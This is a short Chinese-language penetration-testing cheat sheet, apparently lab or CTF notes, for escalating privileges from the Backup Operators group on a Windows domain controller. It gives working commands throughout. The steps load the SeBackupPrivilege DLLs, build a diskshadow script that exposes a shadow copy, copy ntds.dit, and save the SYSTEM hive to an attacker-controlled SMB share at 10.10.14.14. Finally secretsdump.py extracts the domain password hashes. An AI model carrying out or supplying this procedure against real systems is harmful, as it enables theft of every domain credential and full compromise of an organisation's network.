# SeBackupPrivilege

1. 不建议方法（第二种无效再使用）

```clike
net user svc_backup  //查看组确定在Backup Operators
1. 下载模块
upload /root/Desktop/SeBackupPrivilege-master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
以及
upload /root/Desktop/SeBackupPrivilege-master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

2. 加载模块
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll

3. 利用（主要copy看不了的一个可以看的备份过来）
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
把ntds.dit copy到这希望能打开
```

一般是打不开的，所以引入别的手段，按照下面复现即可

优先采用下面的方法：

```clike
最好执行
unix2dos vss.dsh
来更好的为windows执行
```

```clike
1. 写好脚本
-----------------vss.dsh--------------------
set context persistent nowriters
set metadata c:\programdata\df.cab 
//这里的目录需要可读写
set verbose on
add volume c: alias df
create
expose %df% z:
---------------------------------------------
2. 传上去执行好
upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh

确保所在目录可读可写
3. 建立smb共享，或者你先搞到本地然后传回去也行
4. 传递
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
或者直接copy
5. 拿system
reg.exe save hklm\system \\10.10.14.14\system
6. 破解
secretsdump.py -system system -ntds ntds.dit LOCAL
```
